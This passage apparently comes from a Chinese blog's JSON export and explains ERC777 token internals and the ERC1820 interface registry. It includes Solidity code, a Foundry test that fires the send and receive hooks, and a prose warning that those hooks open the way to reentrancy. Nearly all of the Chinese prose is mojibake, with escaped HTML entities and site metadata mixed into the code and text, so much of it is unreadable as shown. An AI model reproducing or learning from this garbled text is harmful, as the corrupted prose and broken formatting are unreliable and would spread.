granularityçš„æ•´æ•°å€ï¼Œå¦åˆ™å°±ä¼šè¢«revertï¼ˆå¦‚ä½•ç†è§£å‘¢ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚granularityçš„å€¼æ˜¯2ï¼Œæ‰§è¡Œmintæ“ä½œçš„æ—¶å€™ï¼Œmint(to,3)å°±ä¼šæŠ¥é”™ï¼Œå› ä¸º 3%2!=0ã€‚ï¼‰ä½†æ˜¯åœ¨ oppenzepelinæºç ä¸­ï¼Œgranularityçš„å€¼è¢«è®¾ç½®ä¸ºäº†1ï¼Œæ‰€ä»¥å¯ä»¥ä¸è¦å¤ªå¤šè€ƒè™‘è¿™ä¸ªå› ç´ ã€‚ 2.1.2 Operatorsæ“ä½œå‘˜æ˜¯ERC777å¼•å…¥çš„ä¸€ä¸ªæ–°æ¦‚å¿µï¼Œæœ‰æ™®é€šæ“ä½œå‘˜å’Œé»˜è®¤æ“ä½œå‘˜ä¹‹åˆ†ã€‚ æ™®é€šæ“ä½œå‘˜ï¼šå³æ˜¯ä»£å¸çš„ holderäº²è‡ªç»™ operatoræˆæƒçš„ï¼Œè¯¥ operatoråªèƒ½æ“ä½œ è¯¥holderçš„ä»£å¸ã€‚ é»˜è®¤æ“ä½œå‘˜ï¼šå³åˆçº¦åˆå§‹åŒ–è®¾ç½®çš„æ“ä½œå‘˜ï¼Œtaçš„æƒé™æ˜¯æœ€å¤§çš„ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒå¯ä»¥æ“ä½œæ‰€æœ‰äººçš„ä»£å¸ï¼Œç±»ä¼¼äºç®¡ç†å‘˜ã€‚ä½†æ˜¯ç”¨æˆ·å¯ä»¥è‡ªè¡Œå°†å…¶ç§»é™¤æƒé™ï¼Œè¿™æ ·ä¸€æ¥taå°±ä¸èƒ½æ“ä½œè‡ªå·±çš„tokensäº†ã€‚ å…ˆç†è§£ä¸‰ä¸ªmappingï¼š 12345// Immutable, but accounts may revoke them (tracked in __revokedDefaultOperators).mapping(address =&gt; bool) private _defaultOperators;// For each account, a mapping of its operators and revoked default operators.mapping(address =&gt; mapping(address =&gt; bool)) private _operators;mapping(address =&gt; mapping(address =&gt; bool)) private _revokedDefaultOperators; _defaultOperatorsï¼šä¿å­˜æŸåœ°å€æ˜¯ä¸æ˜¯é»˜è®¤æ“ä½œå‘˜ï¼Œåœ¨å‡½æ•°åˆå§‹åŒ–çš„æ—¶å€™èµ‹å€¼ã€‚ _operatorsï¼šä¿å­˜ æŸåœ°å€æ˜¯ä¸æ˜¯æŸä»£å¸holderçš„æ“ä½œå‘˜ï¼Œä¼ å‚çš„æ–¹å¼ä¸ºï¼š_operators[tokenHolder][operator]ã€‚ _revokedDefaultOperatorsï¼šä¿å­˜æŸåœ°å€æ˜¯å¦ç§»é™¤äº†é»˜è®¤æ“ä½œå‘˜ï¼Œä¼ å‚çš„æ–¹å¼ä¸ºï¼š_revokedDefaultOperators[tokenHolder][operator])ã€‚ å‡½æ•°ç†è§£ï¼š 1isOperatorFor(address operator,address tokenHolder) æŸ¥çœ‹è¯¥ operetoræ˜¯ä¸æ˜¯tokenHolderçš„æ“ä½œå‘˜ï¼Œå¦‚æœ operatorå’ŒtokenHolderç›¸ç­‰åˆ™è¿”å›trueï¼ˆå› ä¸ºæ¯ä¸ªtokenHolderæ˜¯è‡ªå·±çš„operatorï¼‰ã€‚å¦‚æœä¸ç­‰ï¼Œåˆ™éœ€è¦åˆ¤æ–­operatoræ˜¯ä¸æ˜¯é»˜è®¤æ“ä½œå‘˜ï¼ŒåŒæ—¶è¯¥é»˜è®¤æ“ä½œå‘˜ä¸èƒ½è¢«è¯¥tokenHolderå–æ¶ˆæˆæƒè¿‡ï¼Œå¦‚æœæ˜¯ä¸”æ²¡æœ‰å–æ¶ˆæˆæƒåˆ™è¿”å›trueã€‚ç¬¬ä¸‰ä¸ªä»£ç æ®µ_operators[tokenHolder][operator]åˆ™æ˜¯æŸ¥çœ‹tokenHolderæ˜¯å¦å¯¹operatoræˆæƒäº†ï¼Œyes trueï¼Œno falseã€‚ 1authorizeOperator(address operator) msg.senderï¼ˆtokenHolderï¼‰ä¸º æŒ‡å®š operatoræ‰§è¡Œæˆæƒæ“ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ msg.senderä¸èƒ½ç­‰äºoperatorï¼Œå¦åˆ™revertï¼Œå› ä¸ºmsg.sendedræœ¬èº«å°±æ˜¯è‡ªå·±çš„æ“ä½œå‘˜ï¼Œæ‰€ä»¥ä¸èƒ½å†æ¬¡æˆæƒã€‚è¿˜éœ€è¦åˆ¤æ–­è¯¥ operatoræ˜¯ä¸æ˜¯é»˜è®¤æ“ä½œå‘˜ï¼Œå¦‚æœæ˜¯åˆ™æ‰§è¡Œdelete _revokedDefaultOperators[msg.sender][operator]æ“ä½œï¼ˆå³å°†è¯¥å€¼å˜æˆfalseï¼‰ï¼Œå¦‚æœä¸æ˜¯é»˜è®¤æ“ä½œå‘˜ï¼Œåˆ™å°† operatorsæ˜ å°„çš„å€¼æ›´æ–°ä¸ºtrueï¼ˆæˆæƒæˆåŠŸï¼‰ã€‚ 1revokeOperator(address operator) msg.senderï¼ˆtokenHolderï¼‰æ’¤é”€ æŒ‡å®š operatoræ“ä½œå‘˜èº«ä»½ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ msg.senderä¸èƒ½ç­‰äºoperatorï¼Œå¦åˆ™revertï¼Œå› ä¸ºmsg.sendedræœ¬èº«å°±æ˜¯è‡ªå·±çš„æ“ä½œå‘˜ï¼Œæ‰€ä»¥ä¸èƒ½æ’¤é”€è‡ªå·±ã€‚å¦‚æœ operatoræ˜¯é»˜è®¤æ“ä½œå‘˜ï¼Œåˆ™_revokedDefaultOperators[msg.sender][operator] = trueè¿™æ ·ä¸€æ¥é»˜è®¤æ“ä½œå‘˜ä¾¿ä¸èƒ½æ“ä½œmsg.senderçš„tokensäº†ã€‚å¦‚æœä¸æ˜¯é»˜è®¤æ“ä½œå‘˜ï¼Œåˆ™å°†operatorçš„å€¼æ›´æ–°ä¸ºfalseã€‚ 1defaultOperators() è¿”å›é»˜è®¤æ“ä½œå‘˜åˆ—è¡¨ã€‚ 2.1.3 Send Tokens123456789101112131415function _callTokensToSend( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) private&#123; address implementer = _erc1820.getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH); if (implementer != address(0)) &#123; IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData); &#125;&#125; _callTokensToSendå‡½æ•°ï¼Œå…ˆé€šè¿‡æ³¨å†Œè¡¨getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH)æŸ¥çœ‹ tokenHolder ç”¨æ¥å®ç°IERC777TokensSenderæ¥å£çš„åˆçº¦åœ°å€ADDRESSï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨ADDRESSä¸­çš„tokensToSendå‡½æ•°ã€‚ 123456789101112131415161718function _callTokensReceived( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData, bool requireReceptionAck) private&#123; address implementer = _erc1820.getInterfaceImplementer(to, TOKENS_RECIPIENT_INTERFACE_HASH); if (implementer != address(0)) &#123; IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData); &#125; else if (requireReceptionAck) &#123; require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;); &#125;&#125; _callTokensReceivedå‡½æ•°ï¼Œå…ˆé€šè¿‡æ³¨å†Œè¡¨getInterfaceImplementer(from, TOKENS_RECIPIENT_INTERFACE_HASH)æŸ¥çœ‹ tokenHolder ç”¨æ¥å®ç°IERC777Recipientæ¥å£çš„åˆçº¦åœ°å€ADDRESSï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨ADDRESSä¸­çš„tokensReceivedå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰è¿˜éœ€è¦åˆ¤æ–­ä¼ å…¥çš„å‚æ•°requireReceptionAckï¼Œå¦‚æœå‚æ•°ä¸º trueï¼Œé‚£ä¹ˆåˆ™éœ€è¦æ£€æµ‹æ¥æ”¶è€…toæ˜¯å¦ä¸ºåˆçº¦åœ°å€ï¼Œå¦‚æœæ˜¯åˆçº¦åœ°å€åˆ™revertï¼ˆå…¶ç›®çš„å³ä½¿ä¸ºäº†ä¿è¯contract receiverå¿…é¡»å®ç° ERC777TokensRecipientï¼‰ã€‚ 12345678910111213141516function _move( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) private&#123; _balances[from] = _balances[from].sub(amount); _balances[to] = _balances[to].add(amount); emit Sent(operator, from, to, amount, userData, operatorData); emit Transfer(from, to, amount);&#125; _moveå‡½æ•°åˆ™æ˜¯è´Ÿè´£æ›´æ–°ä½™é¢ï¼Œä¿®æ”¹Holderå’Œreceiverçš„ä»£å¸ä½™é¢ã€‚ 1234567891011121314151617181920function _send( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData, bool requireReceptionAck) private&#123; require(from != address(0), &quot;ERC777: send from the zero address&quot;); require(to != address(0), &quot;ERC777: send to the zero address&quot;); _callTokensToSend(operator, from, to, amount, userData, operatorData); _move(operator, from, to, amount, userData, operatorData); _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);&#125; ERC77 Tokenè½¬ç§»ä»£å¸çš„é€»è¾‘ï¼ŒåŸºæœ¬ä¸Šéƒ½ç¦»ä¸å¼€è¿™ä¸ªå‡½æ•°ã€‚è¯¥å‡½æ•°è¦æ±‚ tokenHolderå’Œreceiverä¸èƒ½ä¸ºé›¶åœ°å€ã€‚å…ˆè°ƒç”¨ tokenHolderçš„é’©å­å‡½æ•°ï¼Œå†æ›´æ–°è´¦æˆ·çš„ä½™é¢ï¼Œæœ€åè°ƒç”¨receiverçš„é’©å­å‡½æ•°ã€‚ 1234567operatorSend( address sender, address recipient, uint256 amount, bytes calldata data, bytes calldata operatorData ) è°ƒç”¨è¯¥å‡½æ•°éœ€è¦åˆ¤æ–­ msg.senderæ˜¯ä¸æ˜¯ senderçš„operatorã€‚éšåè°ƒç”¨ _sendå‡½æ•°ã€‚ 1send(address recipient, uint256 amount, bytes calldata data) è¿™æ˜¯æä¾›ç»™tokenHolderçš„å‡½æ•°ï¼Œå› ä¸ºè°ƒç”¨_sendå‡½æ•°çš„æ–¹å¼ä¸ºï¼š_send(msg.sender, msg.sender, recipient, amount, data, &quot;&quot;, true);è‡ªå·±æ˜¯è‡ªå·±çš„æ“ä½œå‘˜ï¼ŒåŒæ—¶è¿˜è¦æ±‚æ¥æ”¶è€…å¿…é¡»å®ç°ERC777TokensRecipientæ¥å£ï¼ˆå¦‚æœæ¥æ”¶è€…æ˜¯åˆçº¦åœ°å€ï¼‰ã€‚ 1transfer(address recipient, uint256 amount) åŠŸèƒ½ç±»ä¼¼äºsendå‡½æ•°ï¼Œä¹Ÿæ˜¯æä¾›ç»™ tokenHolder çš„å‡½æ•°ã€‚ä¸è¿‡ä¸åŒäºsendå‡½æ•°æ˜¯ï¼Œtransferä¸èƒ½ä¼ userdataï¼Œè€Œä¸”ï¼Œå¦‚æœrecipientæ˜¯åˆçº¦åœ°å€çš„è¯ï¼Œä¸éœ€è¦æ»¡è¶³åˆçº¦åœ°å€ä¸€å®šè¦å®ç°ERC777TokensRecipientæ¥å£çš„è¦æ±‚ï¼ˆå‰ææ˜¯æ¥æ”¶è€…ä¸ä¸èƒ½ä¸ºé›¶åœ°å€ï¼‰ã€‚ 1transferFrom(address holder, address recipient, uint256 amount) åŠŸèƒ½ç±»ä¼¼ERC20ä¸­çš„transferFromå‡½æ•°ï¼Œéœ€è¦ tokenHolderä¸º msg.senderæˆæƒï¼Œå¹¶ä¸”æ£€æŸ¥æˆæƒé¢åº¦çš„æ“ä½œåœ¨_approve(holder, spender, _allowances[holder][spender].sub(amount))ï¼Œå‡½æ•°ä½“æ²¡æœ‰æ˜¾ç¤ºçš„åˆ¤æ–­æˆæƒé¢åº¦ï¼Œè€Œæ˜¯é€šè¿‡äº†ç›´æ¥å‡çš„æ–¹æ³•æ¥éªŒè¯ï¼Œå¦‚æœamountå¤§äºæˆæƒé¢åº¦è¿™ä¸ªå‡æ³•æ“ä½œè‚¯å®šä¼šæŠ¥é”™ï¼Œä¹Ÿç®—ä¸€ç§å¦ç±»çš„éšå¼æ£€éªŒäº†ã€‚ 2.1.4 Mint &amp; Burn Tokens1234567_mint( address operator, address account, uint256 amount, bytes memory userData, bytes memory operatorData ) é“¸å¸åŠŸèƒ½ï¼Œé“¸å¤šå°‘å¸ _totalSupply å°±è¦åŠ å¤šå°‘ã€‚ é“¸å¸ä¼šè°ƒç”¨_callTokensReceivedå‡½æ•°ï¼ŒtokenHolderä¸ºé›¶åœ°å€ï¼Œè€Œä¸”è¿˜éœ€è¦æ£€æµ‹ recipientï¼Œå¦‚æœrecipientæ˜¯åˆçº¦åœ°å€çš„è¯ï¼Œä¸éœ€è¦æ»¡è¶³åˆçº¦åœ°å€ä¸€å®šè¦å®ç°ERC777TokensRecipientæ¥å£çš„è¦æ±‚ï¼ˆå‰ææ˜¯æ¥æ”¶è€…ä¸ä¸èƒ½ä¸ºé›¶åœ°å€ï¼‰ã€‚ æ³¨ï¼šåœ¨è°ƒç”¨_mint()å‡½æ•°çš„å‡½æ•°ä¸­ï¼Œè¦ä¸¥æ ¼æ·»åŠ è®¿é—®æ§åˆ¶ï¼Œå› ä¸º _mint()å‡½æ•°æœ¬èº«æ²¡æœ‰è®¿é—®æ§åˆ¶ï¼Œé¿å…å‡ºç°äººäººå¯é“¸å¸çš„ç°è±¡ã€‚ 1234567_burn( address operator, address from, uint256 amount, bytes memory data, bytes memory operatorData ) é”€å¸åŠŸèƒ½ï¼Œç§æœ‰å‡½æ•°ï¼Œé”€æ¯å¤šå°‘å¸ï¼Œ_totalSupply å°±è¦å‡å¤šå°‘ã€‚é”€å¸å›è°ƒç”¨_callTokensToSendå‡½æ•°ï¼Œrecipientä¸ºé›¶åœ°å€ã€‚ 1operatorBurn(address account, uint256 amount, bytes calldata data, bytes calldata operatorData) å¤–éƒ¨é”€å¸å‡½æ•°ï¼Œå¿…é¡»è¦æ»¡è¶³isOperatorFor(msg.sender, account)æ‰èƒ½æˆåŠŸè°ƒç”¨ã€‚ 2.2 Hookséƒ¨åˆ†2.2.1 ERC777TokensSender :: tokensToSend Hookè¿™æ˜¯ä¸€ä¸ªæ‰§è¡Œè½¬è´¦æˆ–é”€å¸çš„å‰ç½®é’©å­å‡½æ•°ï¼Œå³åœ¨æ‰§è¡Œè½¬è´¦ä¹‹å‰éœ€è¦ä» ERC1820æ³¨å†Œè¡¨ä¸­è·å– å®ç°æ¥å£çš„åˆçº¦implementerï¼Œå¹¶æ‰§è¡Œ implementeråˆçº¦ä¸­çš„tokensToSend ()å‡½æ•°ï¼Œæ‰§è¡Œè¯¥é’©å­å‡½æ•°çš„é€»è¾‘ã€‚è‡³äºæ˜¯ä»€ä¹ˆé€»è¾‘ï¼Œå…·ä½“å–å†³äºåˆçº¦çš„ç¼–å†™è€…ï¼Œå¦‚æœæ˜¯æ‰§è¡Œæ¶æ„æ“ä½œåˆ™å¯èƒ½ä¼šé€ æˆèµ„é‡‘æŸå¤±ï¼ˆé‡å…¥æ”»å‡»)ã€‚ æ¶‰åŠåˆ°çš„å‡½æ•°æœ‰ï¼štransferFrom() transfer() send() operatorSend() operatorBurn()ã€‚ 2.2.2 ERC777TokensRecipient :: tokensReceived Hookè¿™æ˜¯ä¸€ä¸ªæ‰§è¡Œè½¬è´¦æˆ–é“¸å¸çš„åç½®é’©å­å‡½æ•°ï¼Œå³åœ¨æ‰§è¡Œè½¬è´¦ä¹‹åï¼ˆæ›´æ–°å®Œè´¦æˆ·ä½™é¢ï¼Œå³æ‰§è¡Œå®Œ _move()å‡½æ•°ï¼‰éœ€è¦ä» ERC1820æ³¨å†Œè¡¨ä¸­è·å– å®ç°æ¥å£çš„åˆçº¦implementerï¼Œå¹¶æ‰§è¡Œ implementeråˆçº¦ä¸­çš„tokensReceived()å‡½æ•°ï¼Œæ‰§è¡Œè¯¥é’©å­å‡½æ•°çš„é€»è¾‘ã€‚é€»è¾‘å–å†³äºåˆçº¦çš„ç¼–å†™è€…ï¼Œå¦‚æœæ˜¯æ‰§è¡Œæ¶æ„æ“ä½œåˆ™å¯èƒ½ä¼šé€ æˆèµ„é‡‘æŸå¤±ï¼ˆé‡å…¥æ”»å‡»)ã€‚ æ¶‰åŠåˆ°çš„å‡½æ•°æœ‰ï¼štransferFrom() transfer() send() operatorSend() _mint()ã€‚ 2.2.3 Hookçš„å·¥ä½œåŸç†å¤ç°å¤ç°åŸç†ä¸ºï¼šaddress(this)é€šè¿‡ operatorSend(address(this), address(this), 0, &quot;&quot;, &quot;&quot;)è‡ªå·±ç»™è‡ªå·±è½¬è´¦ï¼Œå†æ‰§è¡Œè½¬è´¦ä¹‹å‰ï¼Œå°†address(this)çš„å®ç° IERC777Senderæ¥å£çš„åˆçº¦ä¸º senderï¼Œå¹¶å†™å…¥æ³¨å†Œè¡¨ä¸­ï¼›åŒç†å°†address(this)çš„å®ç° IERC777Recipientæ¥å£çš„åˆçº¦ä¸º recipientï¼Œå¹¶å†™å…¥æ³¨å†Œè¡¨ä¸­ã€‚å¤ç°æ—¨åœ¨è¯´æ˜ï¼Œæ‰§è¡Œè½¬è´¦æ“ä½œæ—¶ï¼Œä½™é¢æ›´æ–°å‰åå¯ä»¥åšä¸€ç³»åˆ—æ“ä½œï¼Œéœ€è¦æ³¨æ„é˜²èŒƒã€‚åœ¨ sender::tokensToSendè¾“å‡ºäº‹ä»¶emit BeforeMove(operator, from, to, amount, &quot;====== BeforeMove() ======&quot;)ï¼Œåœ¨recipient::tokensReceivedä¹Ÿè¾“å‡ºäº‹ä»¶emit AfterMove(operator, from, to, amount, &quot;====== AfterMove() ======&quot;)ã€‚ TestHooks.sol 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;;import &#123;IERC777Sender&#125; from &quot;./IERC777Sender.sol&quot;;import &#123;IERC777Recipient&#125; from &quot;./IERC777Recipient.sol&quot;;import &#123;IERC1820Registry&#125; from &quot;../ERC1820/IERC1820Registry.sol&quot;;import &#123;ERC777&#125; from &quot;./ERC777.sol&quot;;contract TestHooks is Test &#123; string constant ERC1820_PATH = &quot;out/ERC1820.sol/ERC1820Registry.json&quot;; string constant ERC777Sender_PATH = &quot;out/IERC777Sender.sol/ERC777Sender.json&quot;; string constant ERCRecipient_PATH = &quot;out/IERC777Recipient.sol/ERC777Recipient.json&quot;; // string constant ERC777_PATH = &quot;../../../out/ERC777.sol/ERC777.json&quot;; IERC777Sender sender; IERC777Recipient recipient; IERC1820Registry registry; ERC777 erc777; address[] defaultOperators; // to deploy these contracts function setUp() public &#123; sender = IERC777Sender(deployer(ERC777Sender_PATH)); recipient = IERC777Recipient(deployer(ERCRecipient_PATH)); registry = IERC1820Registry(deployer(ERC1820_PATH)); // erc777 = ERC777(deployer(ERC777_PATH)); defaultOperators.push(address(this)); erc777 = new ERC777(&quot;TOKEN&quot;, &quot;token&quot;, address(registry), defaultOperators); &#125; function pre_test() internal &#123; // address(this)ä½œä¸º defaultOperator // 1. address(this)ç”¨æ¥å®ç° tokensToSend å‡½æ•°çš„åˆçº¦æ˜¯ senderï¼Œå°†å…¶å†™å…¥æ³¨å†Œè¡¨ registry.setInterfaceImplementer(address(this), keccak256(abi.encodePacked(&quot;ERC777TokensSender&quot;)), address(sender)); // 2. address(this)ç”¨æ¥å®ç° tokensReceived å‡½æ•°çš„åˆçº¦æ˜¯ recipientï¼Œå°†å…¶å†™å…¥æ³¨å†Œè¡¨ registry.setInterfaceImplementer(address(this), keccak256(abi.encodePacked(&quot;ERC777TokensRecipient&quot;)), address(recipient)); &#125; function test_Hooks() public &#123; pre_test(); // é€šè¿‡è‡ªå·±ç»™è‡ªå·±è½¬è´¦ï¼Œè§¦å‘ senderå’Œrecipientä¸­çš„hookå‡½æ•° erc777.operatorSend(address(this), address(this), 0, &quot;&quot;, &quot;&quot;); &#125; // éƒ¨ç½²åˆçº¦ function deployer(string memory path) internal returns (address addr_) &#123; bytes memory creationCode = abi.encodePacked(vm.getCode(path)); assembly &#123; addr_ := create(0, add(creationCode, 0x20), mload(creationCode)) &#125; &#125;&#125; 3. ERC777çš„å®‰å…¨éšæ‚£ ERC777åè®®å­˜åœ¨çš„å®‰å…¨éšæ‚£ä¾¿æ˜¯ï¼šé‡å…¥æ¼æ´ï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯åœ¨tokensToSend()å’ŒtokensReceived()ï¼‰ã€‚è¯¥æ¼æ´å­˜åœ¨äº_callTokensToSend()å’Œ_callTokensReceived()ã€‚å…·ä½“çš„æ”»å‡»äº‹ä»¶å’Œæ”»å‡»æ­¥éª¤ï¼Œåé¢å†è¡¥å……ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"}]},{"title":"ERC1820","slug":"DEFI/ERC/ERC1820","date":"2024-01-10T04:00:00.000Z","updated":"2024-01-10T04:00:00.000Z","comments":true,"path":"2024/01/10/DEFI/ERC/ERC1820/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/10/DEFI/ERC/ERC1820/","excerpt":"","text":"1. ERC1820ç®€ä»‹ ERC1820æ ‡å‡†å®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„æ³¨å†Œè¡¨åˆçº¦ï¼Œä»»ä½•åœ°å€ï¼ˆä¸ç®¡æ˜¯åˆçº¦åœ°å€è¿˜æ˜¯E0Aè´¦æˆ·åœ°å€ï¼‰éƒ½å¯ä»¥æ³¨å†Œå®ƒæ”¯æŒçš„æ¥å£ä»¥åŠå“ªä¸ªæ™ºèƒ½åˆçº¦è´Ÿè´£æ¥å£å®ç°ã€‚ 2. ERC1820ä»£ç è§£è¯»source codeï¼šé“¾æ¥ã€‚å¦‚æœæƒ³çœ‹æ¯ä¸ªå‡½æ•°çš„å„ä¸ªå‚æ•°ä»£è¡¨ä»€ä¹ˆæ„æ€ï¼Œå¯ä»¥åˆ°è¿™é‡Œï¼šé“¾æ¥ã€‚ mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) internal interfacesï¼šä½œç”¨æ˜¯ä¿å­˜æŸåœ°å€å®ç°æŸæ¥å£çš„åœ°å€ï¼ˆè¯´å®è¯æˆ‘æ„Ÿè§‰æ€ªæ€ªçš„ï¼Œæˆ‘æ„Ÿè§‰æœ‰ç‚¹è¯´ä¸è¿‡å»ï¼Œä¸¾ä¸ªä¾‹å­ï¼šæ¥å£ä¸ºIï¼ŒAå®ç°Içš„åœ°å€æ˜¯Bï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼ŒAç”¨Båœ°å€æ¥å®ç°Iæ¥å£ï¼Œç±»ä¼¼ä»£ç†åˆçº¦çš„é€»è¾‘ï¼ŒproxyåŸºæœ¬ä¸Šéƒ½æ˜¯é€šè¿‡logicåˆçº¦æ¥æ‰§è¡Œé€»è¾‘ï¼‰ã€‚ mapping(address &#x3D;&gt; address) internal managersï¼šä½œç”¨æ˜¯ä¿å­˜æŸåœ°å€çš„ç®¡ç†å‘˜ mapping(address &#x3D;&gt; mapping(bytes4 &#x3D;&gt; bool)) internal erc165Cachedï¼šä½œç”¨æ˜¯ç”¨ä½œç¼“å­˜è¡¨ï¼Œç”¨æ¥è®°å½•æŸåœ°å€æ˜¯å¦å®ç°äº† IERC165æ¥å£ã€‚ ***noThrowCall(address _contract, bytes4 _interfaceId)***å‡½æ•°ï¼Œçš„è¿ä½œåŸç†æ˜¯_contract.staticcall(abi.encodeWithSelector(ERC165.supportsInterface.selector,_interfaceId))ï¼Œå³å°±æ˜¯ä¸ºäº†æ£€æµ‹_contractåˆçº¦æ˜¯å¦å®ç°äº† IERC165ä¸”æ˜¯å¦å®ç°äº†æŒ‡å®šæ¥å£_interfaceIdã€‚ä¸¤ä¸ªè¿”å›å€¼çš„æ„æ€åˆ†åˆ«æ˜¯ï¼Œè°ƒç”¨å‡½æ•°æ˜¯å¦æˆåŠŸï¼Œè¿”å›å€¼æ˜¯å¦ä¸ºtrueã€‚ å¯¹äºnoThrowCall()å‡½æ•°ï¼Œå¯ä»¥æŸ¥ç¼ºè¡¥æ¼ã€‚ æˆ‘å¥½å¥‡çš„æ˜¯ï¼Œå¯¹äº bytes4ç±»å‹çš„ _interfaceIdï¼Œæ‰§è¡Œmstore(add(x, 0x04), _interfaceId)æ“ä½œä¹‹åï¼Œå†é¢„å­˜å‚¨çš„32bytesé‡Œï¼Œtaæ˜¯ä¼šè¢«æ”¾åœ¨å·¦ç«¯è¿˜æ˜¯å³ç«¯ï¼ŒåŒç†å¯¹mstore(x, erc165ID)ä¹Ÿæ˜¯ä¸€æ ·å¥½å¥‡ï¼Œä½†æ˜¯æŒ‰ç…§ç¼–ç è§„åˆ™calldataåº”è¯¥ä¸ºï¼šbytes4(functon.selector)+paramtersï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æ”¾åœ¨å·¦ç«¯ï¼Œå†™è¿‡æµ‹è¯•ç”¨ä¾‹éªŒè¯ï¼š 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.8.0;contract TestAssembly &#123; event msgdata(bytes); function test() public &#123; emit msgdata(msg.data); &#125; function noThrowCall(address _contract, bytes4 _interfaceId) public returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = 0xf8a8fd6d; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := call( gas(), // 30k gas _contract, // To addr 0, // msg.value x, // Inputs are stored at location x 0x24, // Inputs are 36 (4 + 32) bytes long x, // Store output over input (saves space) 0x20 // Outputs are 32 bytes long ) result := mload(x) // Load the result &#125; &#125;&#125; å½“ _interfaceIdä¸º uint32ç±»å‹æ—¶ï¼š 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.8.0;contract TestAssembly &#123; event msgdata(bytes); function test() public &#123; emit msgdata(msg.data); &#125; function noThrowCall(address _contract, uint32 _interfaceId) public returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = 0xf8a8fd6d; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := call( gas(), // 30k gas _contract, // To addr 0, // msg.value x, // Inputs are stored at location x 0x24, // Inputs are 36 (4 + 32) bytes long x, // Store output over input (saves space) 0x20 // Outputs are 32 bytes long ) result := mload(x) // Load the result &#125; &#125;&#125; æ‰€ä»¥å¯¹äº bytes(n)ç±»å‹çš„æ“ä½œï¼Œå†™å…¥æ–¹å¼ä¸ºä»é«˜ä½å†™å…¥ï¼ˆå³å·¦ç«¯å†™å…¥ï¼‰ï¼Œè€Œå¯¹äºuint(n)ç±»å‹åˆ™æ˜¯ä»ä½ä½å†™å…¥ï¼ˆå³å³ç«¯å†™å…¥ï¼‰ã€‚ ***implementsERC165InterfaceNoCache(address _contract, bytes4 _interfaceId)***å‡½æ•°ï¼Œä½œç”¨æ˜¯åœ¨ä¸ä½¿ç”¨æˆ–æ›´æ–°ç¼“å­˜çš„æƒ…å†µä¸‹æ£€æŸ¥åˆçº¦æ˜¯å¦å®ç°IERC165æ¥å£ï¼Œä¸”æ˜¯å¦å®ç° _interfaceIdæ¥å£ã€‚æ£€æŸ¥çš„æ–¹å¼å¾ˆç®€å•ï¼Œå³è°ƒç”¨noThrowCall()å‡½æ•°ï¼Œåªæœ‰å½“å‡½æ•°è°ƒç”¨æˆåŠŸï¼Œä¸”å®ç°äº† _interfaceId æ¥å£ï¼ˆå³ result&#x3D;&#x3D;true ï¼‰æ—¶ï¼Œè¯¥å‡½æ•°æ‰è¿”å›trueã€‚ ***isERC165Interface(bytes32 _interfaceHash)***å‡½æ•°ç”¨æ¥æ£€æµ‹ï¼Œä¼ å…¥çš„æ¥å£hashå€¼æ˜¯ä¸æ˜¯IERC165æ¥å£ï¼Œåˆ¤æ–­æ–¹æ³•å°±æ˜¯ï¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œä¸è¿ç®—ï¼Œå¦‚æœå28ä¸º0ï¼Œé‚£ä¹ˆåˆ™åˆ¤æ–­è¯¥æ¥å£ä¸ºIERC165æ¥å£ã€‚ ***implementsERC165Interface(address _contract, bytes4 _interfaceId)***å‡½æ•°ï¼Œä½œç”¨æ˜¯æ£€æŸ¥ _contractåˆçº¦æ˜¯å¦å®ç°äº† _interfaceId(å¤šæŒ‡IERC165)ï¼Œå¦‚æœä¸åœ¨ç¼“å­˜è¡¨ä¸­å­˜å‚¨è¿‡ï¼Œåˆ™é€šè¿‡implementsERC165InterfaceNoCache() å‡½æ•°æ£€æµ‹ï¼Œå¦‚æœåœ¨ç¼“å­˜è¡¨ä¸­ï¼Œåˆ™åˆ¤æ–­ç”¨äºå®ç° _interfaceIdçš„åˆçº¦æ˜¯ä¸æ˜¯å‚æ•° _contractæœ¬èº«ï¼Œyes return trueï¼Œno return falseã€‚ 